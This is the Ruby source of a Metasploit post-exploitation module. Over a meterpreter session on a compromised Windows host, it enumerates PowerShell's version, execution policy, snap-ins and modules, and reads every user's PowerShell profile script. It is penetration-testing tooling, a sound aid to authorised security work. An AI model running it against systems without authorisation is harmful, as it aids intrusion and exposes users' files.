##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Priv

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Powershell Environment Setting Enumeration',
        'Description' => %q{ This module will enumerate Microsoft Powershell settings },
        'License' => MSF_LICENSE,
        'Author' => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              core_channel_eof
              core_channel_open
              core_channel_read
              core_channel_write
              stdapi_sys_config_getenv
              stdapi_sys_config_getuid
            ]
          }
        }
      )
    )
  end

  #-----------------------------------------------------------------------
  def enum_users
    os = sysinfo['OS']
    users = []
    user = session.sys.config.getuid
    path4users = ""
    env_vars = session.sys.config.getenvs('SystemDrive', 'USERNAME')
    sysdrv = env_vars['SystemDrive']

    if os =~ /XP|2003/
      path4users = sysdrv + "\\Documents and Settings\\"
      profilepath = "\\My Documents\\WindowsPowerShell\\"
    else
      path4users = sysdrv + "\\Users\\"
      profilepath = "\\Documents\\WindowsPowerShell\\"
    end

    if is_system?
      print_status("Running as SYSTEM extracting user list..")
      session.fs.dir.foreach(path4users) do |u|
        userinfo = {}
        next if u =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/

        userinfo['username'] = u
        userinfo['userappdata'] = path4users + u + profilepath
        users << userinfo
      end
    else
      userinfo = {}
      uservar = env_vars['USERNAME']
      userinfo['username'] = uservar
      userinfo['userappdata'] = path4users + uservar + profilepath
      users << userinfo
    end
    return users
  end

  #-----------------------------------------------------------------------
  def enum_powershell
    # Check if PowerShell is Installed
    if registry_enumkeys("HKLM\\SOFTWARE\\Microsoft\\").include?("PowerShell")
      print_status("Powershell is Installed on this system.")
      powershell_version = registry_getvaldata("HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellEngine", "PowerShellVersion")
      print_status("Version: #{powershell_version}")
      # Get PowerShell Execution Policy
      begin
        powershell_policy = registry_getvaldata("HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell", "ExecutionPolicy")
      rescue
        powershell_policy = "Restricted"
      end
      print_status("Execution Policy: #{powershell_policy}")
      powershell_path = registry_getvaldata("HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell", "Path")
      print_status("Path: #{powershell_path}")
      if registry_enumkeys("HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1").include?("PowerShellSnapIns")
        print_status("Powershell Snap-Ins:")
        registry_enumkeys("HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellSnapIns").each do |si|
          print_status("\tSnap-In: #{si}")
          registry_enumvals("HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellSnapIns\\#{si}").each do |v|
            print_status("\t\t#{v}: #{registry_getvaldata("HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellSnapIns\\#{si}", v)}")
          end
        end
      else
        print_status("No PowerShell Snap-Ins are installed")

      end
      if powershell_version =~ /2./
        print_status("Powershell Modules:")
        powershell_module_path = session.sys.config.getenv('PSModulePath')
        session.fs.dir.foreach(powershell_module_path) do |m|
          next if m =~ /^(\.|\.\.)$/

          print_status("\t#{m}")
        end
      end
      tmpout = []
      print_status("Checking if users have Powershell profiles")
      enum_users.each do |u|
        print_status("Checking #{u['username']}")
        begin
          session.fs.dir.foreach(u["userappdata"]) do |p|
            next if p =~ /^(\.|\.\.)$/

            if p =~ /Microsoft.PowerShell_profile.ps1/
              ps_profile = session.fs.file.new("#{u["userappdata"]}Microsoft.PowerShell_profile.ps1", "rb")
              until ps_profile.eof?
                tmpout << ps_profile.read
              end
              ps_profile.close
              if tmpout.length == 1
                print_status("Profile for #{u["username"]} not empty, it contains:")
                tmpout.each do |l|
                  print_status("\t#{l.strip}")
                end
              end
            end
          end
        rescue
        end
      end

    end
  end

  #-----------------------------------------------------------------------
  # Run Method
  def run
    print_status("Running module against #{sysinfo['Computer']}")
    enum_powershell
  end

end
